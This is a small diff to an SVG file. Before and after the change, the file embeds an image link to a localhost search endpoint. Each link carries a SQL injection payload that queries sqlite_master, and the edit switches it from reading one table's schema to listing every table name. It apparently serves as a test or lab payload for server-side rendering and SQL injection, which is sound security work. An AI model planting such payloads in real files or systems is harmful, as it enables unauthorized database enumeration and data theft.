@@ -1,3 +1,3 @@
 <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
-  <image xlink:href="http://localhost/search?q=' UNION SELECT sql,1 FROM sqlite_master WHERE tbl_name='_a1b2c3d4'--" width="100" height="100"/>
+  <image xlink:href="http://localhost/search?q=' UNION SELECT name,1 FROM sqlite_master WHERE type='table'--" width="100" height="100"/>
 </svg>
